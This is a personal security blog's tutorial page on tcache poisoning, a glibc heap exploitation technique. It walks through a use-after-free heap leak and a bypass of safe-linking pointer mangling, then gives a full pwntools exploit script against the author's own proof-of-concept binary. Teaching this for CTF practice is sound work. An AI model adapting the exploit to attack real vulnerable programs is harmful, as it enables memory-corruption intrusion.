<!doctype html> <!-- `site.alt_lang` can specify a language different from the UI --> <html lang="" > <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"> <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"> <meta name="mobile-web-app-capable" content="yes"> <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><!-- Setup Open Graph image --> <!-- Begin Jekyll SEO tag v2.8.0 --> <meta name="generator" content="Jekyll v4.4.1" /> <meta property="og:title" content="Tcache-Poison" /> <meta name="author" content="Cl1nical" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Description Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: how2heap. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command. At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself." /> <meta property="og:description" content="Description Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: how2heap. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command. At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself." /> <link rel="canonical" href="http://localhost:4000/2025/08/13/tcache-poison.html" /> <meta property="og:url" content="http://localhost:4000/2025/08/13/tcache-poison.html" /> <meta property="og:site_name" content="Cl1nical’s cyber security blog" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2025-08-13T06:50:19+02:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Tcache-Poison" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Cl1nical"},"dateModified":"2025-08-13T06:50:19+02:00","datePublished":"2025-08-13T06:50:19+02:00","description":"Description Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: how2heap. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command. At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself.","headline":"Tcache-Poison","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/08/13/tcache-poison.html"},"url":"http://localhost:4000/2025/08/13/tcache-poison.html"}</script> <!-- End Jekyll SEO tag --> <title>Tcache-Poison | Cl1nical's cyber security blog </title> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://realfavicongenerator.net/ --> <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"> <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"> <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"> <link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"> <meta name="apple-mobile-web-app-title" content="Cl1nical's cyber security blog"> <meta name="application-name" content="Cl1nical's cyber security blog"> <meta name="msapplication-TileColor" content="#da532c"> <meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"> <meta name="theme-color" content="#ffffff"> <!-- Resource Hints --> <link rel="preconnect" href="https://fonts.googleapis.com" > <link rel="dns-prefetch" href="https://fonts.googleapis.com" > <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link rel="dns-prefetch" href="https://fonts.gstatic.com" > <link rel="preconnect" href="https://cdn.jsdelivr.net" > <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" > <!-- Bootstrap --> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css"> <!-- Theme style --> <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"> <!-- Web Font --> <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"> <!-- Font Awesome Icons --> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"> <!-- 3rd-party Dependencies --> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"> <!-- Image Popup --> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <!-- Scripts --> <script src="/assets/js/dist/theme.min.js"></script> <!-- JS selector for site. --> <!-- commons --> <!-- layout specified --> <!-- image lazy-loading & popup & clipboard --> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <!-- Pageviews --> <!-- A placeholder to allow defining custom metadata --> </head> <body> <!-- The Side Bar --> <aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"> <header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar/profile.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Cl1nical's cyber security blog</a> <p class="site-subtitle fst-italic mb-0"></p> </header> <!-- .profile-wrapper --> <nav class="flex-column flex-grow-1 w-100 ps-0"> <ul class="nav"> <!-- home --> <li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a> </li> <!-- the real tabs --> </ul> </nav> <div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> </div> <!-- .sidebar-bottom --> </aside> <!-- #sidebar --> <div id="main-wrapper" class="d-flex justify-content-center"> <div class="container d-flex flex-column px-xxl-5"> <!-- The Top Bar --> <header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"> <div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" > <nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Tcache-Poison</span> </nav> <!-- endof #breadcrumb --> <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button> <div id="topbar-title"> Main menu </div> <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button> </div> </header> <div class="row flex-grow-1"> <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"> <!-- Refactor the HTML structure --> <!-- In order to allow a wide table to scroll horizontally, we suround the markdown table with `<div class="table-wrapper">` and `</div>` --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --> <!-- Change the icon of checkbox --> <!-- Handle images --> <!-- take out classes --> <!-- lazy-load images --> <!-- make sure the `<img>` is wrapped by `<a>` --> <!-- create the image wrapper --> <!-- combine --> <!-- take out classes --> <!-- lazy-load images --> <!-- make sure the `<img>` is wrapped by `<a>` --> <!-- create the image wrapper --> <!-- combine --> <!-- take out classes --> <!-- lazy-load images --> <!-- make sure the `<img>` is wrapped by `<a>` --> <!-- create the image wrapper --> <!-- combine --> <!-- take out classes --> <!-- lazy-load images --> <!-- make sure the `<img>` is wrapped by `<a>` --> <!-- create the image wrapper --> <!-- combine --> <!-- Add header for code snippets --> <!-- Create heading anchors --> <!-- return --> <article class="px-1" data-toc="false"> <header> <h1 data-toc-skip>Tcache-Poison</h1> <div class="post-meta text-muted"> <!-- published date --> <span> Posted <!-- Date format snippet See: ${JS_ROOT}/utils/locale-dateime.js --> <time data-ts="1755060619" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Aug 13, 2025 </time> </span> <!-- lastmod date --> <div class="d-flex justify-content-between"> <!-- author(s) --> <span> By <em> Cl1nical </em> </span> <div> <!-- pageviews --> <!-- read time --> <!-- Calculate the post's reading time, and display the word count in tooltip --> <!-- words per minute --> <!-- return element --> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="807 words" > <em>4 min</em> read</span> </div> </div> </div> </header> <div class="content"> <h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3> <p>Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: <a href="https://github.com/shellphish/how2heap/tree/master/glibc_2.39">how2heap</a>. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command.<br /> At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself.</p> <h3 id="video"><span class="me-2">Video</span><a href="#video" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3> <p>This blog post features a video at the following <a href="https://youtu.be/miaxqpKbq8U">link</a> <br /> The video is intended for a more thourough walkthrough than the post itself.</p> <h3 id="walkthrough"><span class="me-2">Walkthrough</span><a href="#walkthrough" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3> <p>Using the POC binary, we will allocate and free a chunk and with the UAF bug we will leak the ptr that it contains. Since there is no other free chunk in the particular tcache bin, the ptr mangling (safe linking) that modern libc tcache employs will not be very effective and we can use the leak to calculate the heap base address. This is very important since it will allow us to calculate where future heap allocations are, enabling us to circumvent the safe linking for future allocations.<br /> Allocate and free a chunk:<br /> <a href="/assets/images/tcache-poisoning/tcache0.png" class="popup img-link shimmer"><img src="/assets/images/tcache-poisoning/tcache0.png" style="width:100%; height:100%;" loading="lazy"></a> And in the tcache metadata we will see:<br /> <a href="/assets/images/tcache-poisoning/tcache1.png" class="popup img-link shimmer"><img src="/assets/images/tcache-poisoning/tcache1.png" style="width:100%; height:100%;" loading="lazy"></a></p> <p>Address 0x555555559010 holds the value 0x1, meaning that there is 1 free chunk in the 0x50 tcache bin.<br /> Address 0x5555555590a8 holds the ptr to the user data of the chunk at the head of the 0x50 tcache bin.<br /></p> <p>As you can see there is a lot of similarity between the ptr contained in the free chunk and the heap base addr. To make things clearer, the heap starts at 0x555555559000 <br /> So if we leak the ptr in the free chunk and left shift it by 12 bits we will have the same value as the heap base address. The following python code achieves this:</p> <div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code># allocate chunk0 p = b"A"*8 malloc(0, 0x40, p) # free chunk0 free(0) # leak heap base via chunk 0 heap_leak = puts(0) heap_leak = heap_leak[:8] heap_leak = u64(heap_leak.ljust(8,b"\x00")) heap_base = heap_leak &lt;&lt; 12 print("heap_base:",hex(heap_base)) </code></div></div> <p>This should give you the following output:</p> <div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>heap_base: 0x555555559000 [*] Switching to interactive mode MENU: 1: Malloc 2: Free 3: Edit 4: Print &gt; $ </code></div></div> <p>Now we need to allocate two chunks, free them and then overwrite the next ptr of the last freed chunk. Something along the lines of:<br /></p> <ul> <li>allocate chunk0 and chunk1</li> <li>free chunk1 and then chunk0</li> <li>calculate the safe_link mangling using the addr of chunk0 and the target addr</li> <li>allocate chunk0 again and then chunk1 which now points to an attacker controlled destination <br /></li> </ul> <p>Allocation, freeing and overwriting:<br /> <a href="/assets/images/tcache-poisoning/tcache3.png" class="popup img-link shimmer"><img src="/assets/images/tcache-poisoning/tcache3.png" style="width:100%; height:100%;" loading="lazy"></a></p> <p>Allocating again:<br /> <a href="/assets/images/tcache-poisoning/tcache4.png" class="popup img-link shimmer"><img src="/assets/images/tcache-poisoning/tcache4.png" style="width:100%; height:100%;" loading="lazy"></a></p> <p>Full exploit POC with comments:<br /></p> <div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="c1">#!/usr/bin/python3 </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"program"</span><span class="p">)</span> <span class="n">gs</span> <span class="o">=</span> <span class="s">''' c '''</span> <span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span> <span class="k">def</span> <span class="nf">start</span><span class="p">():</span> <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span> <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">,</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span> <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">"address"</span><span class="p">,</span> <span class="mi">12345</span><span class="p">)</span> <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="c1">#shellcode = asm('\n'.join([ </span> <span class="c1">#])) </span> <span class="k">def</span> <span class="nf">safe_link</span><span class="p">(</span><span class="n">home</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span> <span class="k">return</span> <span class="p">(</span><span class="n">home</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">target</span> <span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">size</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span> <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">payload</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="k">def</span> <span class="nf">puts</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"4"</span><span class="p">)</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span> <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="k">return</span> <span class="n">leak</span> <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span> <span class="c1"># allocate chunk0 </span><span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="c1"># free chunk0 </span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># leak heap base via chunk 0 </span><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">heap_leak</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="k">print</span><span class="p">(</span><span class="s">"heap_base:"</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span> <span class="c1"># allocate the chunk again and allocate another one of the same size </span><span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="c1"># free chunk2 and then chunk1 # this will cause: chunk1 -&gt; chunk2 </span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># edit the ptr in chunk1 -&gt; target # when doing this, we need to know the address of chunk1 so we can use # the safe_link function # I call the function that contains the ptr the 'home' chunk # By inspecting the heap we can see that the home chunk is at # offset 0x2a0 from the heap base address </span><span class="n">home</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2a0</span> <span class="c1"># We will just target heap_base + 0x100 to demonstrate # It is important that the address is read/writable and that it is # 16 byte aligned, meaning the last character of the address # should be '0' and not '8' or something else </span><span class="n">target</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x100</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">safe_link</span><span class="p">(</span><span class="n">home</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span> <span class="n">p</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="c1"># next up we allocate chunk1 again and then we allocate chunk2 # which was manipulated by us to point # to heap_base+0x100 </span><span class="n">malloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">"XXXX"</span><span class="p">)</span> <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> </code></div></div> </div> <div class="post-tail-wrapper text-muted"> <!-- categories --> <!-- tags --> <div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " > <div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author. </div> <!-- Post sharing snippet --> <div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span> </div> </div> <!-- .post-tail-bottom --> </div> <!-- div.post-tail-wrapper --> </article> </main> <!-- panel --> <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"> <div class="access"> <!-- Get 5 last posted/updated posts --> <section id="access-lastmod"> <h2 class="panel-heading">Recently Updated</h2> <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"> <li class="text-truncate lh-lg"> <a href="/2025/08/14/tcache-libc-leak.html">Libc leak with tcache enabled</a> </li> <li class="text-truncate lh-lg"> <a href="/jekyll/update/2025/08/13/linux.html">Linux</a> </li> <li class="text-truncate lh-lg"> <a href="/2025/08/13/heap.html">Linux Heap</a> </li> <li class="text-truncate lh-lg"> <a href="/2025/08/13/poc-binary.html">POC Binary</a> </li> <li class="text-truncate lh-lg"> <a href="/2025/08/13/safe-linking.html">Safe Linking (tcache, fastbins)</a> </li> </ul> </section> <!-- #access-lastmod --> <!-- The trending tags list --> </div> </aside> </div> <div class="row"> <!-- tail --> <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post. --> <!-- The total size of related posts --> <!-- An random integer that bigger than 0 --> <!-- Equals to TAG_SCORE / {max_categories_hierarchy} --> <!-- Navigation buttons at the bottom of the post. --> <nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/2025/08/13/safe-linking.html" class="btn btn-outline-primary" aria-label="Older" > <p>Safe Linking (tcache, fastbins)</p> </a> <a href="/2025/08/13/exploit-script.html" class="btn btn-outline-primary" aria-label="Newer" > <p>Exploit script template - python</p> </a> </nav> <!-- The Footer --> <footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " > <p>© <time>2025</time> <em class="fst-normal"></em>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span> </p> <p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>. </p> </footer> </div> </div> <!-- The Search results --> <div id="search-result-wrapper" class="d-flex justify-content-center d-none"> <div class="col-11 content"> <div id="search-hints"> <!-- The trending tags list --> </div> <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div> </div> </div> </div> <aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button> </aside> </div> <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div> <!-- Embedded scripts --> <!-- The comments switcher --> <!-- Jekyll Simple Search loader See: <https://github.com/christian-fei/Simple-Jekyll-Search> --> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: ' <article class="px-1 px-sm-2 px-lg-4 px-xl-0"> <header> <h2><a href="{url}">{title}</a></h2> <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags} </div> </header> <p>{content}</p> </article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script> </body> </html>
